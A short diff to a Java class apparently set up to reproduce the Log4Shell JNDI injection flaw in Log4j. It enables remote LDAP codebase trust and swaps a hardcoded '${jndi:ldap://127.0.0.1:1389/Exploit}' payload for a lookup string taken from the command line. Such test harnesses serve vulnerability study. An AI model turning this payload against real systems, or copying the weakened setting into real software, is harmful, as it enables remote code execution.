@@ -8,6 +8,6 @@ public class log4j {
     public static void main(String[] args) {
         //The default trusturlcodebase of the higher version JDK is false
         System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
-        logger.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
+        logger.error("$" + args[0]);
     }
 }
